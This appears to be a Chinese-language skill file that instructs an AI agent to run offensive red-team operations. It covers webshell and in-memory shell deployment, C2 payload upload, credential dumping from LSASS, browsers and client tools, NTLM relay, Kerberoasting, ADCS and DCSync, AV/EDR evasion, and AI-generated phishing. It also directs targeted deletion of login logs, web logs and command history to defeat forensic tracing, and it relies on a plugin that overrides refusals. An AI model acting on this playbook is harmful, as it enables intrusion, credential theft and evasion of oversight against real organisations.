---
name: ad-playbook
description: 攻防评估模式作战手册：Agentic Red Teaming 定位（AEV 持续验证）、阶段编排（侦察/突破/横向/持久化/报告+复测闭环）、外网打点作战流程（hunter 测绘联动/入口面价值提级序/登陆口 JS 专线）、内网攻防作战流程（常见端口侦察+蜜罐甄别/服务线弱口令+锁定策略探测/被动凭据线（同广播域投毒中继）/SSH·Windows·SMB·数据库落点线/框架 EXP/DevOps 与邮件·OA·VPN 高价值线/隔离突破 C 段→B 段/域攻纵深分级（BloodHound→Roasting→ADCS→委派→DCSync）/堡垒机与安防设备优先/横向痕迹管理（目标侧定向清痕+本地台账留痕双轨）/穷尽终止+机器可读黑板与操作痕迹台账）、防御验证（detection gap）、AI 应用红队（Garak/PyRIT/Promptfoo 工具矩阵）、验证与评分、MITRE ATT&CK 映射、证据收集规范与报告模板。
tools: nmap, fscan, nuclei
---

# 攻防评估作战手册

> 本技能随 attack-defense 预设走。
> persona 中的硬规则（底线、证据标准、评分纪律、阶段纪律、负面清单、表达纪律（拒答修复由宿主插件 dsh-refusal-guard 兜底）、claude 逻辑）不在此重复。

## 定位与设计依据

- 2026 主线：Gartner 将 Agentic Red Teaming 列为攻防平台胜负手——本模式即本地 agentic red teaming 编排器。行业坐标与工具锚点见 refs/trends/ad-trends-2025-2026.md。
- 评估形态：AEV（Adversarial Exposure Validation）思路——持续验证暴露面 + 修复复测闭环，不是一次性报告。
- 遵循用户需求指令 + 提供扩展性思路和方向（persona 已写）。

## 权限与数据主线（主观念）

> 主观念锚点：评估围绕**权限与数据主线**自主扩展实施——服务器权限（最高权限/提权）、
> Web 权限（webshell 上传）、数据库权限（SQLi 读写与提权）、严重敏感数据泄露、未授权访问、
> 登录绕过。每阶段向主线目标靠拢，面外发现照常纳入。

| 主线目标 | 作业形态与判定要点 |
|---|---|
| 服务器最高权限 | 提权链验证（suid/内核/服务缺陷/计划任务/组策略）→ whoami/id 级证据（最小影响）；提权只做可行性证明，不破坏服务 |
| Web 权限（webshell 上传） | 上传点→落地路径→可访问性→执行回显（whoami 级）；webshell 用最小无害探针，落地文件与路径登记 residue |
| 内存马 | 仅 Java 系中间件评估场景：注入可行性验证（不残留或登记制登记）；判定要点=过滤链差异/类加载点 |
| 数据库权限 | SQLi 读（库/表/用户哈希）→ 写文件/读文件可行性（OS 层交互只做 whoami 级回显）→ 数据库账号权限枚举 |
| 严重敏感数据泄露 | 数据外带证明最小化（行数/字段名/掩码样本）；完整数据集**不外带不落地**，只登记位置与类型 |
| 未授权 / 登录绕过 | 会话对照重放（带/不带凭证）、接口直调、前端校验绕过（后端是否独立校验） |

**痕迹纪律（主观念红线）**：攻击作业全程**本地记录关键攻击痕迹**（命令/时间戳/产物哈希进
evidence-index），作业结束后**清理目标侧攻击痕迹**（webshell/上传文件/计划任务/账户等）——
清理清单与步骤写入 persistence-registry/residue，由用户确认后执行；先留证后清理，不裸删；
对目标固有数据的删除操作严禁执行，只提示可疑并呈报；横向场景的痕迹四类清理面与清痕
顺序纪律见内网章 §14。**POC 交付**：验证通过的发现直接生成
完整 python 复现脚本（exp/<finding-id>.py）——参数化目标、默认 whoami 级最小影响、
破坏性步骤默认关闭、退出码 0=复现成功——随报告交付客户手动复现。

## 阶段编排

1. 侦察 → 2. 突破 → 3. 横向 → 4. 持久化 → 5. 报告；每阶段只基于上一阶段的**已验证**结果推进。
- **侦察/突破阶段主线见「外网打点作战流程」章**（测绘找面→入口面提级序→登陆口专线→衔接横向）。
- 各阶段用 workflow 扇出，子代理分工：侦察组 / 突破验证组 / 横向组 / 报告组。
- 关键发现经独立子代理交叉复核后才进报告。
- 每阶段产出物登记证据索引（哈希 + 时间戳）。
- **横向阶段以「单机落点信息收集」SOP 为前置**（见下节）：每拿下一台主机先过收集 SOP，再谈横向路径。
- **横向阶段的主线战法见「内网攻防作战流程」章**（单机 SOP 管"一台怎么挖"，作战流程管"整个内网怎么打"）。
- **持久化阶段定义（persona 硬规则）**：可行性验证 = 真实落地→验证生效→**立即登记**
  `persistence-registry.md`（技术类型 / 落点主机与位置 / 建立时间 / 生效验证证据 /
  **手动排除步骤**——写到照做能拆的程度），**不自动清理**；报告必须附持久化清单，
  detection gap 汇总中每条持久化对应「目标侧是否检测到」。

## 阶段默认通道（装备栏：流程定默认，能力定降级；内网按监测姿态分叉）

> 元原则同 pentest：通道成本随流程递增、轻重分离；通道缺失按「工具使用策略·通道完整阶梯」
> 降级（已挂 → 自配 → 问装 → 脚本 → 诚实降级）；跨阶段复用查附录 C-2；内网动作先过 §0.5 姿态卡。

| 阶段/能力 | 默认通道 | 降级链 |
|---|---|---|
| 外部测绘侦察（找面） | **dsh-hunter**（测绘，已挂即用） | kali MCP（amass_scan/theharvester_osint）→ web_search/OSINT refs → 脚本 |
| 外部探活/指纹/入口盘点 | curl/httpx（轻通道先行） | kali MCP（nmap_scan/whatweb_scan/wafw00f_scan）→ 脚本 |
| 登陆口 JS 专线 | Chrome MCP（复用 pentest §3 专线） | webdriver 消指纹链 → 静态拉 JS |
| web 侧利用/认证后交互 | burpsuite/yakit MCP（会话态保真） | curl 带凭据（登记无拦截损失）→ POC 脚本 |
| 内网段发现/存活 | **按监测姿态分叉**（下表） | — |
| 内网横向/执行 | **kali MCP 重武器库**（netexec/impacket 全家/evil-winrm/responder） | 本机工具（附录 A-2）→ 脚本 → 诚实降级 |
| 域攻 | kali MCP（bloodhound_collect → kerberoast 线 → impacket_secretsdump） | 本机 impacket 套件 → 手工协议 |
| 隧道/枢纽 | chisel（kali MCP chisel_tunnel/本机） | socat_relay → proxychains → 脚本 |
| 防御验证（detection gap） | 目标侧证据请求清单（用户确认制） | 日志/告警样本离线分析 |

**内网能力 × 监测姿态分叉**（姿态卡见 §0.5）：

| 能力 | 无监测（效率优先） | 有监测（OPSEC 优先） |
|---|---|---|
| 段发现/存活 | fscan 全速综合（先过 §0.5 三道闸） | netspy 被动段发现 → 跳板 ARP/DNS 观察 → 慢速分时段单段 |
| 端口/服务 | fscan/nmap 快扫（常见端口带，§0） | nmap -T2 分时段+混入正常流量，只探高价值端口 |
| 弱口令 | fscan 内置爆破（过锁定闸） | **禁在线爆破** → Kerberoast/AS-REP 离线 → 单点慢速验证 |
| 横向移动 | impacket exec 线直接打 | 凭据使用型（PtH/Kerberos 票据）优于新登录；WMI/计划任务低日志通道 |
| 凭据收集 | secretsdump 直取 | DCSync 单请求优于批量登录；LSASS 读取防 EDR |

> 姿态分叉总则：**有监测时同能力从「扫描发现型」换「凭据使用型」**——不产生发现流量，只
> 产生难区分正常性的认证行为；高噪声动作先过 op-traces 台账预登记再执行。

## 单机落点信息收集（横向前置 SOP）

> 命令级展开见 `refs/zh-intranet/intranet-host-collect.md`（Windows W1~W21 / Linux L1~L14
> 模块库 + 触发表 + 执行通道坑表）；本节是编排约束。核心是**渐进式**——先轻量识别，
> 再按模块逐层收集，按发现决定深挖方向，不一次性灌入大量命令。
> **三阶段视角（收集服务于目标）**：按当前所处阶段选重点——提权期看系统/内核/补丁/服务，
> 权限维持期看账号/自启动/计划任务/中间件，横向期看网卡/外连/凭据/配置/存活网段；
> 覆盖清单仍是全量基线（防漏），视角决定深挖优先级。

- **阶段 0（OS + OPSEC）**：识别目标系统；同时探测监控基线（Sysmon/PS 日志/auditd/EDR）——
  有监控则切换低噪声命令形态（cmd 优先、少传文件）。识别结果与模块计划先报告再推进。
- **基础收集 + 必做清单自检**：按模块表逐模块执行（用户/系统/网络双向/进程/服务/防火墙/
  RDP/敏感文件/持久化面/所有用户家目录遍历…）；跑完**暂停深挖，对照模块表逐项标
  ✅完成/⏭️跳过(原因)/❌失败**——收集覆盖情况登进 evidence-index 后才允许进深挖与横向派单
  （与阶段终态表互为表里：终态表管阶段，模块清单管收集面）。
- **按触发表深挖**：发现 Redis→缓存挖掘、Java 应用→jar 配置提取、RDP 记录→关联 IP、
  数据库客户端→连接凭据、计划任务→读脚本正文……对每个服务问三问：能未授权访问吗？
  拿到权限能做什么？它连着什么？（映射表见 refs 新篇「深挖触发表」节）
- **资产归纳 + 凭证发散闭环**（让收集的信息「活」起来）：
  ① 所有来源的 IP 去重合并成内网资产清单（跨网段机器优先标记）；
  ② 对清单做定向深度扫描（配置/历史暴露的 IP 是高价值目标，不盲扫全段）；
  ③ 凭证发散：收集的密码去重 + 家族衍生（同前缀@年份）→ 逐服务验证/低频爆破
  （ssh/rdp/smb/mysql/mssql/redis/web 后台）→ **新凭据立即复用→再收集→循环扩大**；
  爆破限速防锁定（速率纪律照常）。
- **敏感信息跨源关联**：同一 IP 跨源合并、密码绑定服务、私钥 ↔ known_hosts 求交、
  配置外联 IP 标为跨网段入口——全部以 links（discovered_on/leads_to/enables）写进
  evidence-index 认知层，关系边聚合即攻击图（报告阶段直接导出路径台账）。

## 外网打点作战流程（侦察/突破阶段主线）

> 适用=攻防评估的侦察与突破阶段（拿到互联网侧立足点为止）；突破成立后转「单机落点
> 信息收集 SOP」+「内网攻防作战流程」继续。**工具用法与验证姿势复用 pentest-playbook**
> （对照三件套/被拦换路序列/速率纪律/POC 交付），本章只写打法与提级序，不重复工具细节。
> 边界：测绘与打点均不越授权范围（范围歧义停下问）。

### 0 测绘侦察线（找面）

- **hunter 狩猎联动**：「hunter 狩猎」页统一 DSL 搜组织资产（如 `domain="授权主域"`）——
  测绘侧资产（影子资产/边缘服务/预生产环境/历史开放端口）与被动情报（证书透明/DNS/
  指纹）**双源合并**，回注 targets 清单与资产台账；需先在 hunter 页配置平台 API key，
  未配置时只走被动情报线。
- 蜜罐甄别沿用内网章 §0 纪律：动手前筛（全端口开放/通用 banner/过易命中），疑似蜜罐
  只被动观察。

### 1 入口面价值提级序（打什么先——按"可直接转化为权限/数据"排序）

1. **弱口令**（登录口/后台/中间件管理台）
2. **未授权访问**（管理台/接口/对象存储）
3. **登陆绕过**
4. **任意文件上传**（webshell 路径）
5. **任意文件读取/下载**（配置/源码/凭据）
6. **命令执行**
7. **反序列化**
8. **框架通用 Nday**（指纹命中即试，EXP 纪律照内网章章头通用防崩溃条款）
9. **SQL 注入**（读凭据→复用）
10. **SSRF**（内网探针/云元数据）
11. **边界设备/VPN Nday**（防火墙/SSLVPN 类——指纹命中即试，EXP 纪律照通用防崩溃条款）

- 每类打法细节走 pentest-playbook 挖掘面与 refs（本模式是编排者，不复制工具手册）；
- 任一命中 → 验证（对照三件套）→ **突破成立即登记成果** → 转横向衔接（见 §3）。

### 1.5 社工与钓鱼线（授权范围内的人面入口）

- 鱼叉邮件投递/凭证钓鱼（仿冒登录页）/水坑攻击——打法见 refs offensive/phishing-campaign.md；
- **AI 生成钓鱼（2026 演习重点）**：定制化话术/深度伪造内容，制作与检测面见 refs trends/ad-trends-2025-2026.md；
- 社工面（OSINT）先行收集目标人员与组织架构（refs offensive/social-engineering.md）；钓鱼拿到的凭据照 §2 硬编码优先利用纪律直接复用。

### 2 登陆口专线（无帐密时的标准动作）

- **优先读登录页 JS**：bundle 全量拉取 → 四类结构化线索（路由/接口清单、签名与加密
  机制、前端校验逻辑、敏感注释与硬编码密钥）→ 发现的 API / 敏感信息 / 硬编码回填
  资产与黑板；
- **web 页面硬编码凭据优先利用（全模式通则）**：页面/JS 中发现可用凭据（账号密码、
  AK/SK、密钥、token 等）→ **优先直接用凭据展开**（登录、鉴权接口直连、云 API 按凭据
  类型对号）——凭据不可用或穷尽后才续 API 安全等其余测试；凭据结论随黑板登记；
- **JS 获取通道降级链**：首选 Chrome MCP（指纹消除纪律与降级链同 pentest-playbook
  登陆口专线——剔除自动化开关/清空 navigator.webdriver/真实 UA，防 WAF 识别自动化）；
- **再测 API 安全**：逐接口无凭证/低权限对照、越权、未授权、注入面；
- 拿到会话/凭据 → 回提级序复用（凭据全服务喷）。

### 2.5 webshell 立足点作战节（获取→连接→立足点作业；打点产出 webshell 而非 ssh 时）

**获取与上传（标准序；兜底=用户直供 shell）**：
- **免杀需求走免杀对抗模式生成**（加密马免杀变体，产物路径直接使用）；快速需求用
  `webshell_generate`（默认 php-aes2：加密通道+eval 结构化能力，jsp/aspx 同型）。
- 落盘经文件上传漏洞/任意写入原语；上传后 `webshell_file ls` 确认落位与权限（0644 起步，
  需执行权限时 chmod）。
- **兜底**：用户直接提供现成 shell（URL+口令/盐）——不问形态直接 `webshell_connect`
  自动识别（自研加密/一句话/冰蝎 PHP·JSP/哥斯拉/魔改变体/内存马 X-C 全兼容）；识别失败按
  返回的 attempts 逐项排查（口令/盐/参数名），再回报用户换通道。
- **Java 系内存马路线**（免杀对抗模式注入器产物或 `webshell_generate jsp-mem-filter`
  引导器：上传→访问一次（回显 MEMSHELL-OK）→删引导文件（先备份，trash 不 rm）→以
  behinder-java 通道+内存马形态连接**任意存活路径**（Filter 全站劫持；删引导文件后连接仍在）；
  X-C 触发型内存马（Filter/Controller/Module）用 dsh-mem 通道连接。内存马登记制：注入即登记
  residue（过滤器名/触发头/口令），作业结束按残留清单处置。
- **连接验证**：connect 自动回填协议/OS/基本信息 → 概览页确认用户、工作目录、禁用函数；
  全程入 op_log 台账。外部 harness 场景经 mcp-studio 接 Webshell MCP 同核等价。

**连上后标准动作（立足点作业）**：
- **系统定锚**（`webshell_exec`）：whoami/id/uname/网络配置/进程清单/盘符——判定当前
  权限与逃逸面，回填黑板。
- **密码本收集**（命令式优先，`webshell_exec`/`webshell_file`）：浏览器保存凭据与历史、
  ~/.ssh 密钥与 known_hosts、运维配置明文口令（web.config/wp-config.php/database.yml/
  application.properties/redis.conf 等）——配置文件用 file read 拉回解析，凭据全部回
  artifacts/creds.txt 并全服务复用（§3）；无 eval 通道时 ls/find 定位 + read 分段拉取。
- **数据库配置收集→直连**：从应用配置提取连接串（host/port/user/pass）→ `webshell_db
  profile.save` 建档案（目标机 PDO 原生出站，比上传工具更隐蔽更稳）→ dbs/tables/SELECT
  验证连通与数据面；本机客户端（mysql.exe/redis-cli.exe/sqlcmd.exe）可作旁证同路线。
- **C2 回连上传**：`webshell_file write` 上传载荷（自动分块，大文件先 hash 校验）→ 经
  `webshell_exec` 拉起（通道限制适配：长任务 nohup/分离进程后台化，防阻塞单请求通道）→
  上线确认后 shell 退居备份通道；载荷路径+删除计划进痕迹台账。
- **通道限制适配**：命令经 webshell 受超时/编码/权限限制——长任务拆短命令、输出落文件
  再分段读、交互式命令改非交互等价（`net share` 类卡死命令换注册表读取同款纪律）。

**清痕纪律**：上传/改动属环境改动——工具路径+删除计划进操作痕迹台账（插件每次操作已自动
记 op_log，概览页可对账；**删其他马用 A 通道、自删留最后或换通道**——通道本体删除即断连）；
用完即 `file_delete`；敏感文件搜索优先命令式（W12/L6），全盘搜索工具是横向受阻时的进阶手段。

### 3 打点到横向的衔接

- 突破成立（任一立足点）→ **单机落点信息收集 SOP** 全量过一遍 → 内网作战流程从
  第 0 节起打；
- 拿到的凭据立即回 `artifacts/creds.txt` 并全服务复用（衔接内网章 §1 服务线）；
- 互联网侧立足点同样进操作痕迹台账（webshell 地址/新增账号等）。

## 内网攻防作战流程（横向主线战法）

> **适用姿态**：用户未给额外约束、且未提供蓝队内网监测情报时的默认打法。用户给出更严
> 约束→从其约束；提供蓝队监测情报→OPSEC 升级（低噪声形态优先、减少落盘与外联）。
> **全程红线**：严禁 DDoS、严禁删除/破坏数据、严禁把目标系统或服务打崩。
> **利用类通用防崩溃纪律**（适用一切 EXP/RCE/提权动作，含框架 EXP、数据库提权、SMB 历史
> 漏洞）：优先选防崩溃形态；执行前评估目标崩溃风险；一次失败不重试轰炸、换路径；发现
> 目标服务异常（卡死/重启迹象）立即停手。老系统（WinXP/Win7/Server2008 等）一律升入
> 用户确认制。

### 0 侦察与端口策略（不做全端口扫描）

- **常见端口优先**：web 带（80/443/8080/8443/8000-8100/9000 常用位）、数据库
  （3306/1433/6379/27017/5432/9200/11211）、22 ssh、445/139 smb、21 ftp、3389 rdp、
  堡垒机常见端口——只探常见端口，不全端口扫描。
- **fscan 初扫起步**（工具卡见附录 A-2）：快速拿存活主机+开放端口+内置弱口令初步结果，
  **再按结果定向扩散**——不盲扫，配置/历史/密码本里出现过的 IP 与端口进高优先队列。
- **泄漏信息关联**：密码本、配置文件、历史命令中暴露的 IP/端口/凭据直接作为扩散起点。
- **蜜罐/蜜饵识别（动手前筛）**：爆破、凭据复用、漏洞利用之前，先对目标做蜜罐甄别——
  全端口全服务开放、多服务共用一个 banner、admin/admin 过易命中、新入清单却"完美"的
  资产，均按疑似蜜罐处理（标记后跳过主动打点，只被动观察）；宁可放过不打，不给蓝队送警报。

### 0.5 监测姿态判定（内网版防护画像，产出姿态卡）

按「轻的先动、能被动不主动」判定目标内网监测姿态，产出**监测姿态卡**（无监测/低监测/
高监测三档）登记黑板（assets.md），后续内网工具选择一律按姿态分叉（装备栏）：

1. **纯被动（先做）**：任务书/用户确认的安防设备与日志平台（用户确认制）；已控跳板的
   ARP 表/DNS 查询/广播流量观察；测绘与历史情报中的告警痕迹。
2. **低主动（被动无果再做）**：蜜罐甄别特征（§0）；账户锁定策略探测（服务线前置）；
   EDR/杀软存在性单点探测（Kerberos 错误码、SMB 签名协商、进程名单点）。
3. **判定规则**：任一命中监测设施（态势感知/EDR/蜜罐/全面审计日志）→ 至少「低监测」；
   两项及以上或确认 SOC 在线 → 「高监测」；全部无果且用户确认无 → 「无监测」（首个
   动作仍按最保守假设执行，验证无告警再放开）。

**fscan 三道闸**（无监测姿态启用 fscan 前全过）：①**姿态闸**——高监测禁用（全段高密度
探测+多协议爆破指纹太明显）②**锁定闸**——锁定策略探测先行，防把目标打成锁定告警
③**登记闸**——未登记资产不扫（防盲打）。**netspy 定位**=段发现被动优先（主动模式同样有
ARP/ICMP 特征，姿态卡 ≥ 低监测时只跑被动模式）。

### 1 服务线：发现即打（弱口令优先）

- 发现 ssh / smb / 各类数据库服务后，**直接组织弱口令爆破**（复用密码本+家族衍生），
  目标是获得各服务的可用权限。
- **爆破前锁定策略探测**：Windows 域先探账号锁定策略（lockoutThreshold/观察时长）；
  高锁定风险目标改**低频跨用户 spray**（每账号 1-2 次、拉长间隔），单用户高频爆破只用于
  无锁定风险的服务；绝不把账号锁死——锁死即暴露。
- 新凭据立即复用→再收集→循环扩大（衔接单机落点 SOP 的凭证发散闭环）。
- 命中与资产即时回写黑板文件（见过程纪律），供扇出子代理与工具直接消费。

### 2 被动凭据线（必须找准位置才开打）

- **启动硬前提**：已在目标网段内拥有落点、与受害主机**同广播域**（LLMNR/NBT-NS/mDNS
  是广播/组播协议，跨网段收不到），或已处于中继路径上——**从落点主机发起**；外网盲挂
  无效，不算进展。
- **responder 收凭据**：广播域名投毒收割 Net-NTLMv2 → 哈希就地复用（PTH 走 nxc）或
  离线破解后回 creds.txt。
- **ntlmrelayx 中继**：前提=目标关闭/未强制 SMB 签名（先探测签名状态再选 relay 目标），
  可中继到 smb/ldap/http（ldap 中继可给账号提权、加机器账号——高价值）。
- **coercer 强制认证**：静默等待无流量时，对已控可达主机枚举强制认证方法制造中继流量。
- **噪声评估**：投毒在广播域留痕，蓝队监测在时降级或弃用此线。

### 3 SSH 落点线

- 拿到 ssh 权限：低权限→尝试提权（内核漏洞/sudo 配置/suid/计划任务）。
- 提权或直接高权限后，**按「单机落点信息收集」SOP 全面收集**：系统内配置信息、
  历史命令中的帐密、密码本、部署的 web 系统、系统配置、数据库可达性与凭据、
  **多网卡情况（隔离突破的第一线索）**；凭据收割同样过「四件套」（见 Windows 落点线，
  Linux 侧对应 = 密码本文件/浏览器/`.ssh` 私钥与 known_hosts/历史记录）。

### 4 Windows 落点凭据链

- **入口**：SMB 历史 RCE / RDP·WinRM 弱口令 / web 落点恰在 Windows / 服务弱口令。
- **凭据链（按序取，逐级回黑板）**：
  ① 本地 SAM 离线（reg save 三件套 + secretsdump 离线解）；
  ② 在线 LSASS（mimikatz/lsassy/nanodump——**先探 EDR**，有 EDR 走隐蔽 dump 形态，
  遇杀软拦截按「AV/EDR 衔接」纪律切 av-evasion 模式知识）；
  ③ 域票据（Rubeus 请求/导出，Kerberoasting 命中的服务票据直接用）；
  ④ **PTH 批量验证**（impacket/nxc 以哈希横向，批量撞已网段 smb/winrm/ldap）——
  每个命中即新立足点，登记成果（哈希集 hash map kind）。
- 抓取纪律：单轮抓取即可，不反复 dump（每次 LSASS 访问都是风险与痕迹）。
- **落点凭据收割四件套（每台必过，产出全部回 creds.txt 并立即复用）**：
  ① 系统凭据（上方链：SAM/LSASS/票据）；
  ② **密码本文件**——站内"记密码"产物（txt/xls/doc/onenote 等，按 password/密码/账号/
  口令/账密 关键词搜用户目录与**共享盘**）；
  ③ **浏览器保存的账号密码**——chrome/edge 走 DPAPI+Login Data 链、firefox 走 NSS，
  Cookie 一并取（会话复用=免口令登录）；
  ④ **应用与连接工具数据**——Navicat/Xshell/WinSCP/FileZilla/TeamViewer/todesk/RDP 记录
  （每个客户端=一组「主机+账号+密码」）。
  命令级展开见 refs/zh-intranet/ 的 intranet-password-collection.md（密码本/共享盘/字典）
  与 intranet-credential-theft.md（浏览器全家族链/LaZagne）。

### 5 SMB 落点线（老系统历史漏洞——用户确认制）

- 发现 SMB 且指纹显示老系统（WinXP / Win7 / Server2008 等）→ 评估永恒之蓝类历史 RCE。
- **硬规则**：利用前必须向用户告知目标系统版本与崩溃风险，**请求确认是否继续**；
  确认后按章头「利用类通用防崩溃纪律」执行——防崩溃形态、失败不轰炸、绝不打崩。

### 6 数据库线（连上后按序回答五问）

1. **敏感数据**：能否取到大量三要素级数据（姓名/身份证号/手机号匹配）——只关注敏感
   数据：体量小→落到本地项目目录作数据得分证据；体量大→抽样+计数取证，不整库下载。
2. **系统凭据**：能否取到系统账号密码→登录关联 web 系统。
3. **配置深挖**：能否取到更多系统配置→换取更多权限。
4. **网段发现**：能否发现关联的内网其他网段 / 挂网段信息（回注资产清单）。
5. **服务器权限**：能否从数据库打到服务器权限（mysql udf/启动项、mssql xp_cmdshell、
   redis 写 crontab/sshkey 等经典路径）。

### 7 常见框架线（无服务器/数据库权限时的 web 侧打法）

- 已有 EXP 的框架系统：直接利用已有 EXP 获取 web 权限 / 服务器权限 / 数据库权限 /
  敏感数据（EXP 使用纪律照本手册验证与评分节；崩溃风险照章头通用纪律）。
- 登陆口弱口令测试照做；**登陆口有验证码且环境导致多次测试失败→停止自动化尝试，
  提醒用户自行操作弱口令测试**（不要绕验证码轰炸）。
- webshell：上传成功后**通知用户连接**（给地址与密码）或自行连接，尝试获取服务器
  权限；上传地址与密码当场记入操作痕迹台账。

### 8 非常见系统线

- 不在已知框架内的系统：测常见漏洞面——未授权访问、弱口令、登陆绕过等可获取 web
  权限或服务器权限的漏洞；可传 webshell（同上纪律）再取服务器权限。

### 9 DevOps 与身份系统高价值线（发现即提级）

- **DevOps/中间件**：Jenkins / GitLab / Harbor / Nexus / Drone / Argo 等——拿 web 权限后
  直取 **CI 凭据**（节点 ssh 凭据/registry token/部署私钥/环境变量密钥），CI 凭据往往
  直通批量服务器；凭据全部回黑板复用验证。制品库只取证不投毒（投毒属破坏性红线边缘，
  需要时先问用户）。
- **邮件/OA/VPN**：邮箱=密码重置枢纽（控制邮箱≈可重置关联身份体系的任意账号密码，
  也含通讯录=内网人员与组织结构情报）；OA（致远/泛微/用友 NC）按 N-day EXP 打（走
  常见框架线纪律）；VPN/SSLVPN 凭据=二次稳定入口，凭据入黑板。
- **AV/EDR 衔接**：webshell 上传、工具落地、LSASS 抓取等终端动作遇杀软/EDR 拦截时，
  按生态协作技能切 **av-evasion 模式**知识与免杀形态（终端侧谨防杀软是硬前提）；
  免杀产物同样进操作痕迹台账。

### 10 隔离突破与网段递进

- 在已有服务器权限上尝试突破内网隔离（多网卡/路由/代理链/SOCKS 链）。
- 突破成功→对新网段**从第 0 节重新开局**。
- **网段穷尽递进：C 段穷尽 → B 段**（逐段递进不跳段；每段产出入资产清单）。

### 11 高价值目标优先（发现即提级）

- **发现域控→进第 12 节域攻纵深分级**（不直奔硬打）。
- **发现堡垒机→优先控制堡垒机权限**（凭证汇聚点，拿下即批量获得纳管资产入口）。
- **发现安防设备/SIEM 控制台（EDR 控制台/SIEM/防火墙管理口）→用户确认制**：拿下=
  致盲检测，战术价值最高但动作极敏感——必须先告知用户并请求确认；确认后**只读取证
  优先**（看告警与资产台账反推蓝队视角），不改配置、不关防护、不清日志。

### 12 域攻纵深分级（升级梯，逐级取凭据回黑板）

1. **域侦察**：BloodHound 采集攻击路径图（ACL/委派/ADCS 边），找最短路径。
2. **Kerberoasting / AS-REP**：无预认证账号与高权服务票据→离线破解或就票据使用。
3. **ADCS 攻击**（certipy ESC1-8）：证书模板配置缺陷→申请证书=任意用户身份。
4. **委派利用**：非约束/约束委派、RBCD→以服务身份行事。
5. **DCSync / DCShadow**：同步域哈希（krbtgt=黄金票据原料）→域控权限落袋。
- 每级产出（票据/哈希/证书）立即回 creds.txt 并复用验证；升级失败不硬撞，退一级换路径。

### 13 成果反哺与穷尽终止

- **实时登记**：每获取一类权限（服务器/数据库/web）或一批敏感数据→**先登记
  redteam 成果（战果清单板式）再继续**——成果落库是继续扩散的前置。
- **信息反哺**：全程搜集的 IP/凭据/网段/配置全部回注资产清单与凭证发散，用于扩展
  内网成果。
- **终止条件**：各线的权限与敏感数据**穷尽**（无新路径、无新凭据、无新网段可扩）→
  收敛结束，汇报战果（战果清单 + 攻击路径台账 + detection gap 汇总）。

### 14 横向痕迹管理（目标侧定向清痕 + 本地台账留痕双轨）

目的：防防守方由日志溯源攻击路径；本地同步留痕保证报告可完整还原攻击时间线。
**清痕与登记一体执行——只清痕不登记=违规，只登记不清痕=残留事故**。

- **痕迹四类清理面（横向场景）**：
  - **登录/认证日志**：Windows Security 4624/4625/4648/4672、System 7045
    （wevtutil 按事件 ID+时间窗定向清，**禁止整卷 cl**——整卷清除本身即强告警且毁固有
    数据）；Linux wtmp/btmp/lastlog、auth.log/secure（定向时间段清理，last/lastb 复验）。
  - **Web/中间件日志**：access/error 中攻击源 IP+时间窗命中行（nginx/apache/IIS/
    tomcat）——先 grep 确认命中行数，再定向删行，保留其余业务日志。
  - **命令执行历史**：bash_history（含未落盘内存历史）、PowerShell
    ConsoleHost_history.txt、python/sqlplus 历史、~/.viminfo——**退出 shell 前清**。
  - **攻击残留物**：上传工具与产物、webshell、新增账户/计划任务/服务/自启动项、
    载荷落盘与临时目录文件（清理清单进 persistence-registry/residue，用户确认后执行）。
- **清痕顺序纪律（顺序不可倒）**：① 停增痕（退出会话前先清命令历史；停仍在产日志的
  进程与计划任务）→ ② 清残留物（文件/账户/任务）→ ③ 清日志（登录→web→命令三类放
  最后——前两步动作本身还会产生新日志事件）→ ④ 复验（last/wevtutil qe/grep 重查
  确认），复验结果回写台账。
- **克制红线**：定向优于整卷（只动攻击时间窗+攻击源相关行）；时间戳篡改默认不用
  （固有数据破坏，仅提示不执行）；**SIEM/日志外发场景承认清痕极限**——终端侧清了
  中心侧还在，如实登记「残留不可清」并呈报，不假装清干净。
- **本地登记留痕（报告撰写素材，op-traces 台账扩展列）**：每次横向动作实时登记
  「时间/主机/动作/产生痕迹类型/清理方式/清理结果/残留未清项+原因」——报告三用：
  ①攻击路径时间线完整还原；②残留清单=客户修复与取证建议（**能无告警清日志本身
  = detection gap，写入报告发现**）；③复测对照基线。先留证后清理，不裸删。

### 过程纪律（全程有效）

- 测试 log 与使用到的脚本**全部落在项目目录**（artifacts/ 日志与脚本分区），不留散页。
- **机器可读黑板（子代理扇出的唯一事实源，工具直接消费）**：
  - `artifacts/targets.txt`——纯 IP/网段清单，每行一条（`fscan -hf` 直接读）；
  - `artifacts/assets.csv`——资产全字段台账，表头固定 `ip,port,service,source,note`；
  - `artifacts/users.txt` / `artifacts/creds.txt`——纯账号清单 / 纯凭据清单
    （`hydra -L -P`、nxc 批量直接读；凭据来源与命中记录写 evidence-index，不混进清单）。
  新发现/新凭据即时追加；横向组扇出的全部子代理共享这四个文件，禁止各记各的。
- **操作痕迹台账 `artifacts/op-traces.md`（报告门结构校验物）**：表头固定含
  「shell 地址」「ssh 密钥」「创建的用户」三列（另可加时间/位置列）；凡目标侧留下的
  东西——上传 webshell 的地址与密码、ssh 私钥及位置、新建用户与凭据、持久化项（另见
  persistence-registry）——逐条登记供事后排查清理；**无任何痕迹也要写表头+「无」行**。
- 破坏性攻击（DDoS/删数据/打崩系统或服务器）一律禁止，见章头红线。

## 子代理编排

### 角色表

| 角色 | 载体 | 输入 → 输出 | 派工要点 |
|---|---|---|---|
| **总控**（主会话） | — | 目标 → 阶段推进 / 门禁判定 / 产物落盘 / 阶段转换检查点（显式列 gate 清单再进） | 不另设总控子代理；主会话即编排者 |
| 侦察组 | workflow 扇出（per-资产/per-服务） | 授权范围 → `assets.md` + 证据索引 | prompt 只带侦察方法论（pentest-playbook 侦察章 / refs recon 类），**不带利用章** |
| 路径规划员 | 单个 spawn | 侦察产物 → candidate_paths + chosen_path（含放弃理由） | 只给原始侦察材料，不给总控预判 |
| 突破验证组 | workflow（per-路径）或 ralph 试错循环 | chosen_path → 已验证 finding（可复现证据） | ralph 适合「尝试-失败-调整」迭代；速率纪律照常 |
| 横向组 | workflow 扇出 | 已验证突破 + 授权范围 → 横向路径证据 | refs/offensive 横向系 + zh-intranet/ |
| 持久化验证员 | 单个 spawn | 授权明示 → 持久化落地+生效证据+清单登记 | 见上节持久化定义；登记即收工 |
| **防御验证员** | 独立 spawn | 关键 finding → 「目标侧检测到没」+ detection gap 条目 | 本模式独有角色；对照 refs/defense/ir-* 与检测工程篇 |
| 复核员 | 独立 spawn（`independent-review` 技能） | 原始材料（不给主链结论）→ 确认/挑战 + **gate-pass/fail** | 兼任门禁官；关键 finding 先 DSH 独立复核（跨模型复核为建议项，用户触发） |
